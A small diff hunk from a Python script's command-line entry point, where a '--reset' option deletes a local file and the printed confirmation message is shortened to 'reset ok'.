@@ -761,7 +726,7 @@ if __name__ == "__main__":
     elif "--reset" in a:
         try: os.remove(EVID)
         except Exception: pass
-        print("reset ok (survival ledger kept)")
+        print("reset ok")
     else:
         try: main()
         except SystemExit: pass
